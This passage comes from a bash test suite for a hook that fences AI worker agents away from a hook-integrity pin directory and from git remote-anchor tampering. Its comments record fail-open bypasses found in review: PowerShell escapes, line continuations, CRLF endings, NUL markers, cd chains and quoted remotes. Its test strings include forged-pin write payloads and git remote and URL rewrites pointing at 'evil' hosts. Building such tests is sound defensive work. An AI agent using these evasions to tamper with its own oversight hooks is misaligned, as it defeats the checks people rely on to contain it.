# --- PowerShell's escape character is the BACKTICK, and
# the tokenizer modelled no PowerShell escape at all -- so a backtick-escaped
# separator inside an UNQUOTED PowerShell path was treated as a real segment
# boundary, truncating the token to a path that matches no file, and the real
# script went unscanned (fail-OPEN). Reuses the `forge;payload.sh` fixture: the
# quoted spelling of this same path is the case above, so
# the pair isolates dialect escape handling from quote handling.
# A literal backtick, assembled once so the fixtures below stay readable.
PIN_BT='`'
PIN_PWSH_ESCSEP_CMD="bash ${PIN_SCRIPT_DIR_NATIVE}/forge${PIN_BT};payload.sh"
assert_rc "pin-dir write denied via a backtick-escaped separator in an unquoted PowerShell path (HIMMEL-2218 codex-2)" 2 \
    "$(run_case "$(j_pwsh "$PIN_PWSH_ESCSEP_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- a bash backslash-newline (or PowerShell
# backtick-newline) line continuation joins two PHYSICAL lines into ONE logical
# command before the real shell parses it. Each awk input record is one
# physical line, so a script path split across a continuation used to extract
# as two unrelated fragments and the real file was never scanned (fail-OPEN).
# `for` + `ge.sh` rejoins to the existing $PIN_SCRIPT_DIR/forge.sh fixture.
PIN_CONT_CMD=$(printf 'bash %s/for\\\nge.sh' "$PIN_SCRIPT_DIR")
assert_rc "pin-dir write denied via a bash backslash-newline line continuation (HIMMEL-2218 codex-3)" 2 \
    "$(run_case "$(j_bash "$PIN_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
PIN_PWSH_CONT_CMD=$(printf 'bash %s/for%s\nge.sh' "$PIN_SCRIPT_DIR" "$PIN_BT")
assert_rc "pin-dir write denied via a PowerShell backtick-newline line continuation (HIMMEL-2218 codex-3)" 2 \
    "$(run_case "$(j_pwsh "$PIN_PWSH_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Positive control on the odd/even rule that decides a continuation: TWO
# trailing backslashes are an escaped literal backslash, so the line really
# ends and nothing joins -- the resulting `.../for\` path matches no file.
# Joining here would be over-eager, not fail-closed, so this must stay rc=0.
PIN_CONT_EVEN_CMD=$(printf 'bash %s/for\\\\\nge.sh' "$PIN_SCRIPT_DIR")
assert_rc "an even run of trailing backslashes is not a line continuation (HIMMEL-2218 codex-3 control)" 0 \
    "$(run_case "$(j_bash "$PIN_CONT_EVEN_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- CRLF line endings.
# AWK splits records on \n, so a command submitted with CRLF keeps the \r at
# the END of every record -- which means the escape character continuing the
# line is no longer the LAST character and the continuation join never fires.
# Verified a live fail-OPEN on BOTH dialects before the fix (rc=0 on the branch
# head that added the join, rc=2 after stripping one terminal \r). The strip
# happens once at the scanner entry point, so it also keeps a stray \r out of
# every token, rather than being patched per branch.
PIN_CR=$(printf '\r')
PIN_CRLF_CONT_CMD=$(printf 'bash %s/for\\%s\nge.sh' "$PIN_SCRIPT_DIR" "$PIN_CR")
assert_rc "pin-dir write denied via a bash line continuation with CRLF endings (HIMMEL-2218 codex-3, PR #2005 CodeRabbit)" 2 \
    "$(run_case "$(j_bash "$PIN_CRLF_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
PIN_PWSH_CRLF_CONT_CMD=$(printf 'bash %s/for%s%s\nge.sh' "$PIN_SCRIPT_DIR_NATIVE" "$PIN_BT" "$PIN_CR")
assert_rc "pin-dir write denied via a PowerShell line continuation with CRLF endings (HIMMEL-2218 codex-3, PR #2005 CodeRabbit)" 2 \
    "$(run_case "$(j_pwsh "$PIN_PWSH_CRLF_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Negative control: the same CRLF continuation shape resolving to a BENIGN
# script must stay rc=0, so the two cases above are the payload being caught
# and not the \r strip turning into a blanket deny on any CRLF command.
PIN_CRLF_BENIGN_CMD=$(printf 'bash %s/beni\\%s\ngn.sh' "$PIN_SCRIPT_DIR" "$PIN_CR")
assert_rc "CRLF line continuation to a benign script still allowed (HIMMEL-2218 codex-3 control)" 0 \
    "$(run_case "$(j_bash "$PIN_CRLF_BENIGN_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- PowerShell embeds a literal quote inside a
# single-quoted string by DOUBLING it, so the doubled pair is one literal
# character in the token -- not a close followed by a reopen. Reading it as
# close-then-reopen dropped the quote character and produced a path matching no
# file. Bash has no doubling rule (two adjacent single-quoted strings really do
# concatenate), so the fix is pwsh-gated and the bash control below pins that.
PIN_SQ_FORGE="$PIN_SCRIPT_DIR/it's forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SQ_FORGE"
PIN_PWSH_SQ_CMD="bash '${PIN_SCRIPT_DIR_NATIVE}/it''s forge.sh'"
assert_rc "pin-dir write denied via a PowerShell doubled single-quote in a script path (HIMMEL-2218 expansion)" 2 \
    "$(run_case "$(j_pwsh "$PIN_PWSH_SQ_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Bash control: the SAME text under bash is two adjacent quoted strings that
# concatenate to `its forge.sh`, which is not a file -- so bash semantics must
# stay unchanged (rc=0). A rc=2 here would mean the pwsh rule leaked dialects.
PIN_BASH_SQ_CMD="bash '${PIN_SCRIPT_DIR}/it''s forge.sh'"
assert_rc "bash adjacent-quote concatenation semantics unchanged by the pwsh doubling rule (HIMMEL-2218 expansion control)" 0 \
    "$(run_case "$(j_bash "$PIN_BASH_SQ_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- Modelling only the
# self-escaping trio (backtick, dollar, double-quote) was not enough. In
# PowerShell the backtick ALWAYS escapes: `n `t `r `a `b `f `v stand for control
# characters, `0 for NUL, and for ANY other character the backtick is simply
# DROPPED. So `xforge.sh really is xforge.sh -- an ordinary command with no
# exotic filename at all -- and the old model produced a literal-backtick path
# that matched no file, leaving the script unscanned. A fail-OPEN, verified
# rc=0 before / rc=2 after.
PIN_PWSH_ESCX_FORGE="$PIN_SCRIPT_DIR/xforge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_PWSH_ESCX_FORGE"
assert_rc "pin-dir write denied when a PowerShell unrecognized escape drops the backtick (HIMMEL-2218 codex-2, panel round 2)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}xforge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Negative control: same escape shape, benign target — must stay allowed, or
# the case above would prove only that PowerShell commands are denied wholesale.
PIN_PWSH_ESCX_BENIGN="$PIN_SCRIPT_DIR/xok.sh"
printf 'echo hello world\n' > "$PIN_PWSH_ESCX_BENIGN"
assert_rc "PowerShell unrecognized-escape path to a benign script still allowed (HIMMEL-2218 codex-2 control)" 0 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}xok.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# And a RECOGNIZED sequence must resolve to its control character, not to the
# letter: `t is a TAB, so this fixture is only reachable if the resolver runs.
PIN_TAB=$(printf '\t')
PIN_PWSH_TAB_FORGE="$PIN_SCRIPT_DIR/for${PIN_TAB}ge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_PWSH_TAB_FORGE"
assert_rc "pin-dir write denied when a PowerShell \`t resolves to a real tab in the path (HIMMEL-2218 codex-2, panel round 2)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/for${PIN_BT}tge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- PowerShell's
# VARIABLE-LENGTH escape, `u{...}. Expectations here are not inferred from
# docs -- they were taken from a real PowerShell 7.6.5, which resolves
# "`u{66}orge" AND bare `u{66}orge alike to forge. So `u{66}orge.sh genuinely
# executes forge.sh, and a model that stops at one-character escapes looks for
# a literal u{66}orge.sh and scans nothing. This is the encoding that matters
# most of the escape family: a worker can apply it to ANY path, needing no
# unusual filename at all.
assert_rc "pin-dir write denied via a PowerShell \`u{...} escape in a quoted path (HIMMEL-2218 codex-1, panel round 3)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}u{66}orge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via a PowerShell \`u{...} escape in a BARE path (HIMMEL-2218 codex-1, panel round 3)" 2 \
    "$(run_case "$(j_pwsh "bash ${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}u{66}orge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Control: the same encoding resolving to the BENIGN script must stay allowed
# (0x62 = b, so this is benign.sh), or the two cases above would only prove
# that any command containing a backtick is denied.
assert_rc "a \`u{...} escape resolving to a benign script is still allowed (HIMMEL-2218 codex-1 control)" 0 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}u{62}enign.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Control: a MALFORMED sequence is not a unicode escape at all and must not be
# resolved as one -- otherwise the parser would invent paths on any `u it sees.
assert_rc "a malformed \`u{zz} is not treated as a unicode escape (HIMMEL-2218 codex-1 control)" 0 \
    "$(run_case "$(j_pwsh "bash \"${PIN_SCRIPT_DIR_NATIVE}/${PIN_BT}u{zz}orge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- COMPLETENESS BY ENUMERATION.
# The PowerShell backtick grammar is FINITE, so the resolver is closed by
# enumerating it rather than by waiting to see whether another review round
# finds a hole. Every expectation below was read off a real PowerShell 7.6.5:
#
#   `n=10  `t=9  `r=13  `a=7  `b=8  `f=12  `v=11  `0=0     (control sequences)
#   `$=$   `"="  ``=`                                       (self-escaping trio)
#   `u{66}=f                                                (variable length)
#   `x=x                                                    (default: drop the backtick)
#
# NOT complete after all, and worth saying so plainly rather than leaving the
# claim standing: the round-5 panel found `e (ESC, 0x1B) missing from the list
# above. The enumeration was written out by hand instead of derived from
# about_Special_Characters, so it reproduced the author-s blind spot -- the
# exact failure mode enumeration was supposed to prevent. `e is deferred to
# a follow-up with the >255-codepoint issue; a fix there should extend these
# cases from the language reference, not from another hand-written list.
#
# One case per form. The control sequences are asserted in the NEGATIVE
# direction, which is the direction that actually matters and needs no exotic
# filename: `n must NOT degrade to the letter n. Each fixture below is a REAL
# pin-forging payload named for<letter>ge.sh, so a resolver that collapsed the
# sequence to its letter would resolve onto the payload and DENY -- these cases
# pass only because the sequence resolved to a control character instead.
PIN_ESC_DIR=$(mktemp -d -t pin-escgrammar.XXXXXX)
PIN_ESC_DIR_NATIVE=$(native_dir "$PIN_ESC_DIR")
for _esc_letter in n t r a b f v 0; do
    printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_ESC_DIR/for${_esc_letter}ge.sh"
done
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_ESC_DIR/forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_ESC_DIR/for${PIN_BT}ge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_ESC_DIR/for\$ge.sh"

for _esc_letter in n t r a b f v 0; do
    assert_rc "PowerShell \`$_esc_letter resolves to its control character, not the letter (escape-grammar enumeration)" 0 \
        "$(run_case "$(j_pwsh "bash \"${PIN_ESC_DIR_NATIVE}/for${PIN_BT}${_esc_letter}ge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
done

# Self-escaping trio. `` and `$ resolve to characters that ARE legal in a
# filename, so these two assert the POSITIVE direction: the payload is found.
assert_rc "pin-dir write denied via a PowerShell \`\` escape (literal backtick in the path)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_ESC_DIR_NATIVE}/for${PIN_BT}${PIN_BT}ge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via a PowerShell \`\$ escape (literal dollar in the path)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_ESC_DIR_NATIVE}/for${PIN_BT}\$ge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# `" cannot be asserted positively -- a double quote is not a legal NTFS
# filename character -- so assert what actually matters: it must NOT terminate
# the string. Real PowerShell reads this whole thing as ONE argument
# (.../forge.sh";echo hi), which is not a file, so the command is allowed. A
# tokenizer that let `" close the quote would see `bash <dir>/forge.sh` as its
# own segment and DENY. This case passes only when `" is escaped correctly.
assert_rc "a PowerShell \`\" escape does not terminate the quoted path (escape-grammar enumeration)" 0 \
    "$(run_case "$(j_pwsh "bash \"${PIN_ESC_DIR_NATIVE}/forge.sh${PIN_BT}\";echo hi\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- The NUL filter has to sit on the
# EMITTED path, not on the token. A NUL can also arrive through the modeled
# CWD -- `cd path`0suffix` puts one in a candidate directory -- and the
# token-only test let that through, whereupon the bash reader silently dropped
# the NUL and spliced the candidate into a REAL directory, denying a command
# PowerShell never pointed there. Same false-positive shape as the `0 bug the
# grammar enumeration caught, one layer further in.
PIN_CDNUL_DIR=$(mktemp -d -t pin-cdnul.XXXXXX)
PIN_CDNUL_DIR_NATIVE=$(native_dir "$PIN_CDNUL_DIR")
mkdir -p "$PIN_CDNUL_DIR/sub"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_CDNUL_DIR/sub/forge.sh"
assert_rc "a NUL reaching the modeled cwd is not repaired into a real directory (panel round 4 codex-2)" 0 \
    "$(run_case "$(j_pwsh "cd ${PIN_CDNUL_DIR_NATIVE}/su${PIN_BT}0b; bash forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Control: the identical chain through the REAL directory must still deny, or
# the case above would pass merely because cd-tracking stopped working.
assert_rc "the same cd chain through the real directory still denies (panel round 4 codex-2 control)" 2 \
    "$(run_case "$(j_pwsh "cd ${PIN_CDNUL_DIR_NATIVE}/sub; bash forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- The BSD-awk NUL fallback. BSD awk cannot
# build a NUL, so the pin scan stands the printable marker SOH NUL SOH in for
# one. Unlike a NUL that marker is a LEGAL filename: a real payload script named
# with it would be filtered out as "holds a NUL" and never scanned (an
# under-block). The hook refuses any command or cwd carrying the marker instead.
# The payload really exists and really writes into the pin dir, so on a BSD awk
# (emulated by NUL = "") the deny is the guard's, not the scan's.
PIN_MARK=$(printf '\001NUL\001')
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_CDNUL_DIR/${PIN_MARK}forge.sh"
assert_rc "a script named with the awk NUL-fallback marker is denied, not filtered out of the scan (HIMMEL-3177)" 2 \
    "$(run_case "$(j_bash "bash ${PIN_CDNUL_DIR}/${PIN_MARK}forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "a cwd carrying the awk NUL-fallback marker is denied (HIMMEL-3177)" 2 \
    "$(run_case "$(j_bash "cd ${PIN_CDNUL_DIR}/sub${PIN_MARK}x; echo hi")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# The marker can also be REBUILT from a PowerShell `u{1} escape (SOH), with no
# literal marker byte in the command; the guard refuses that spelling too.
assert_rc "a PowerShell \`u{1} escape rebuilding the awk NUL-fallback marker is denied (HIMMEL-3177)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_CDNUL_DIR_NATIVE}/${PIN_BT}u{1}NUL${PIN_BT}u{1}forge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "a zero-padded PowerShell \`u{0001} marker rebuild is denied (HIMMEL-3177)" 2 \
    "$(run_case "$(j_pwsh "bash \"${PIN_CDNUL_DIR_NATIVE}/${PIN_BT}u{0001}NUL${PIN_BT}u{01}forge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "an unrelated PowerShell \`u{2} escape is not caught by the marker guard (HIMMEL-3177 control)" 0 \
    "$(run_case "$(j_pwsh "bash \"${PIN_CDNUL_DIR_NATIVE}/${PIN_BT}u{2}x.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Control: the same script WITHOUT the marker in its name and an ordinary
# command still behave as before (the marker guard is not a blanket deny).
assert_rc "an ordinary command with no marker is still allowed (HIMMEL-3177 control)" 0 \
    "$(run_case "$(j_bash "echo hi")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- Adjudicated DISPROVED as a bypass but
# pinned here so it stays disproved. The claim was that the continuation join
# can replace a real script path and let a write through. For any command a
# shell will actually EXECUTE, the join preserves detection: the interpreter and
# script tokens sit on the first physical line and survive the join, and a quote
# that closes on a later line still ends its token before the next segment. The
# one shape whose modelling the join does change is a command with an
# UNTERMINATED quote — which bash refuses outright ("unexpected EOF while
# looking for matching") and therefore never runs, so there is no write to fence.
# These two cases are the executable shapes; a real regression would flip them.
PIN_JOIN_ARG_CMD=$(printf "bash %s/forge.sh 'arg\\\\\nmore'" "$PIN_SCRIPT_DIR")
assert_rc "a continuation inside a quoted ARGUMENT does not hide the script (panel round 2 codex-1)" 2 \
    "$(run_case "$(j_bash "$PIN_JOIN_ARG_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
PIN_JOIN_SEG_CMD=$(printf "bash '%s/a\\\\\nb'; bash %s/forge.sh" "$PIN_SCRIPT_DIR" "$PIN_SCRIPT_DIR")
assert_rc "a closed quote across a continuation still ends its segment (panel round 2 codex-1)" 2 \
    "$(run_case "$(j_bash "$PIN_JOIN_SEG_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- The candidate set
# used to be built as an unchanged BLOCK followed by an advanced BLOCK, so
# once MAXCAND was reached the first-N truncation dropped the advanced block
# wholesale -- i.e. every "the latest cd succeeded, but an earlier one did not"
# candidate vanished at once. The round-5 protected index-1 invariant covers
# only the all-success chain, so a payload reachable ONLY on a mixed
# success/failure path was a fail-OPEN. Fixed by interleaving the two branches
# per candidate, so truncation degrades both evenly.
# Fixture: six distinct RELATIVE cd targets (the set doubles per target, so the
# 6th overflows MAXCAND=32) where `d5` does NOT exist and the payload sits at
# d1/d2/d3/d4/d6 -- reachable only on the "every cd but d5 succeeded" branch,
# which is the candidate the old block layout truncated away.
PIN_INTERLEAVE_DIR=$(mktemp -d -t pin-interleave.XXXXXX)
mkdir -p "$PIN_INTERLEAVE_DIR/d1/d2/d3/d4/d6"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_INTERLEAVE_DIR/d1/d2/d3/d4/d6/forge.sh"
PIN_INTERLEAVE_JSON=$(jq -n --arg cmd 'cd d1; cd d2; cd d3; cd d4; cd d5; cd d6; bash forge.sh' \
    --arg cwd "$PIN_INTERLEAVE_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "pin-dir write denied on a partial-failure cd branch past MAXCAND (HIMMEL-2225 round 6 codex-1)" 2 \
    "$(run_case "$PIN_INTERLEAVE_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# A CUSTOM pin dir configured in one
# drive-letter spelling (POSIX) must still be caught when the worker's command
# references the SAME directory in the OTHER spelling (native/Windows) --
# cross-spelling, unlike the same-spelling-both-sides case above. Rooted under
# $HOME (a genuine "/c/..." <-> "C:/..." drive mapping), NOT mktemp's default
# TMPDIR (MSYS mounts /tmp as its own alias, not a plain drive-letter pair, so
# a TMPDIR-rooted fixture cannot exercise this conversion at all). The
# "pin-cross-" name deliberately does not match the fixed default-path suffix
# check, isolating this case to the drive-letter-canonicalization fix.
PIN_CROSS_DIR=$(mktemp -d "$HOME/pin-cross-XXXXXX")
PIN_CROSS_DIR_NATIVE=$(native_dir "$PIN_CROSS_DIR")
assert_rc "pin-dir write denied via cross-spelling custom dir (codex-1 round 2)" 2 \
    "$(run_case "$(j_bash "echo pwned > $PIN_CROSS_DIR_NATIVE/forged.json")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_CROSS_DIR")"

# Matching only the RESOLVED absolute
# path missed the shell expanding an UNEXPANDED variable reference at
# execution time — the command text never contains the resolved path as a
# literal substring, so the original check alone missed it. A custom pin-dir
# fixture (not containing "himmel/hook-integrity" in its own name) isolates
# the var-name branch from the fixed-suffix branch below.
PIN_VAR_CUSTOM_DIR=$(mktemp -d -t pin-custom.XXXXXX)

# PowerShell's canonical $env:X /
# ${env:X} scope-qualified variable syntax must be denied too -- the round-1
# fix only matched bash-style $X / ${X}.
# shellcheck disable=SC2016  # literal unexpanded PowerShell $env: reference is the command text under test
PIN_ENV_CMD='Set-Content -Path "$env:HIMMEL_HOOK_INTEGRITY_DIR/forged.json" -Value pwned'
assert_rc "pin-dir write denied via PowerShell \$env: reference (codex-2)" 2 \
    "$(run_case "$(j_pwsh "$PIN_ENV_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_VAR_CUSTOM_DIR")"
# shellcheck disable=SC2016  # literal unexpanded PowerShell ${env:X} reference is the command text under test
PIN_ENV_BRACED_CMD='Set-Content -Path "${env:HIMMEL_HOOK_INTEGRITY_DIR}/forged.json" -Value pwned'
assert_rc "pin-dir write denied via PowerShell \${env:X} braced reference (codex-2)" 2 \
    "$(run_case "$(j_pwsh "$PIN_ENV_BRACED_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_VAR_CUSTOM_DIR")"

# shellcheck disable=SC2016  # literal unexpanded env-var reference is the command text under test
PIN_VAR_CMD='echo pwned > "$HIMMEL_HOOK_INTEGRITY_DIR/forged.json"'
assert_rc "pin-dir write denied via unexpanded \$HIMMEL_HOOK_INTEGRITY_DIR reference (codex-1)" 2 \
    "$(run_case "$(j_bash "$PIN_VAR_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_VAR_CUSTOM_DIR")"
# shellcheck disable=SC2016  # literal unexpanded env-var reference is the command text under test
PIN_VAR_BRACED_CMD='echo pwned > "${HIMMEL_HOOK_INTEGRITY_DIR}/forged.json"'
assert_rc "pin-dir write denied via unexpanded \${HIMMEL_HOOK_INTEGRITY_DIR} braced reference (codex-1)" 2 \
    "$(run_case "$(j_bash "$PIN_VAR_BRACED_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_VAR_CUSTOM_DIR")"
# shellcheck disable=SC2016  # literal unexpanded $HOME reference is the command text under test
PIN_HOME_CMD='echo pwned > "$HOME/.claude/himmel/hook-integrity/forged.json"'
assert_rc "pin-dir write denied via unexpanded \$HOME default-path reference (codex-1)" 2 \
    "$(run_case "$(j_bash "$PIN_HOME_CMD")" "HIMMEL_WORKER=1")"

# The bypass is honoured only inside a linked worktree of the
# session's recorded repo (positive controls: test-block-worker-bypass-scope.sh);
# this suite runs from the primary/CI checkout, where it must NOT disable the fence.
assert_rc "pin-dir write STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
    "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE" "HIMMEL_HOOK_INTEGRITY_BYPASS_OK=1")"

# Scope boundary: a worker gets ONLY the pin-dir and anchor-tamper classes; no
# push/gh/network classifier exists here any more.
assert_rc "native worker git push NOT blocked by this hook (out of HIMMEL-2085 scope)" 0 \
    "$(run_case "$(j_bash 'git push origin main')" "HIMMEL_WORKER=1")"
assert_rc "native worker unrelated command allowed" 0 \
    "$(run_case "$(j_bash 'git status')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- anchor-tamper fence (origin/<default> repoint) -------------
# Every DENY row below runs on a dispatched worker (HIMMEL_WORKER=1) — worker-ness,
# not lane, same as the pin-dir class above.
assert_rc "anchor-tamper: local-path fetch with a bare refspec" 2 \
    "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: local-path fetch with a HEAD:refs/remotes refspec" 2 \
    "$(run_case "$(j_bash 'git fetch . HEAD:refs/remotes/origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: local-path push with a refs/remotes refspec" 2 \
    "$(run_case "$(j_bash 'git push . HEAD:refs/remotes/origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: absolute-path fetch with a refspec" 2 \
    "$(run_case "$(j_bash 'git fetch /tmp/evil.git x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: git -C <dir> local-path fetch with a refspec" 2 \
    "$(run_case "$(j_bash 'git -C /some/dir fetch . x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: remote set-url" 2 \
    "$(run_case "$(j_bash 'git remote set-url origin /tmp/e.git')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: remote add" 2 \
    "$(run_case "$(j_bash 'git remote add decoy /tmp/e.git')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: update-ref on refs/remotes/origin/main" 2 \
    "$(run_case "$(j_bash 'git update-ref refs/remotes/origin/main deadbeef')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: symbolic-ref rewrite" 2 \
    "$(run_case "$(j_bash 'git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/evil')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: remote set-head" 2 \
    "$(run_case "$(j_bash 'git remote set-head origin evil')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: insteadOf remote-URL rewrite" 2 \
    "$(run_case "$(j_bash 'git -c url.https://evil/.insteadOf=https://github.com/ fetch origin')" "HIMMEL_WORKER=1")"

# `remote remove` / `remote rm` / `remote rename` were
# named in the threat model but left out of the prescribed class (i)
# fence list, so all three measured rc=0 ALLOW while `add` and `set-url`
# denied. They matter to class (ii) as well as class (i): removing or renaming
# `origin` collapses the configured-remote set the destination gate consults,
# while a stale refs/remotes/origin/main survives and still DWIMs. `rm` is a
# real alias — `git remote rm` prints `usage: git remote remove <name>`, not
# "unknown subcommand" (git-remote(1) lists "remove, rm").
assert_rc "anchor-tamper: remote remove" 2 \
    "$(run_case "$(j_bash 'git remote remove origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: remote rm (alias for remove)" 2 \
    "$(run_case "$(j_bash 'git remote rm origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: remote rename" 2 \
    "$(run_case "$(j_bash 'git remote rename origin old')" "HIMMEL_WORKER=1")"

# codex-6 (Important, reproduced): class (ii)'s remote-argument alternatives
# (`.`, `./...`, `../...`, `/...`) were bare-spelling-only literal text, so
# quoting the remote defeated the match — measured rc=0 ALLOW pre-fix on
# `git fetch "." x:origin/main`. Every row below is the SAME shape as an
# already-denied bare row above, just with the remote argument spelled through
# a different shell quoting form; anchor_unquote() must collapse each back to
# the bare spelling before the regex runs.
assert_rc "anchor-tamper codex-6: double-quoted dot remote" 2 \
    "$(run_case "$(j_bash 'git fetch "." x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: single-quoted dot remote" 2 \
    "$(run_case "$(j_bash "git fetch '.' x:origin/main")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: backslash-escaped dot remote" 2 \
    "$(run_case "$(j_bash 'git fetch \. x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: adjacent-double-quote-concatenated dot remote" 2 \
    "$(run_case "$(j_bash 'git fetch "".""  x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: ANSI-C-quoted dot remote" 2 \
    "$(run_case "$(j_bash "git fetch \$'.' x:origin/main")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: double-quoted ./relative remote" 2 \
    "$(run_case "$(j_bash 'git fetch "./evil.git" x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: single-quoted ../relative remote" 2 \
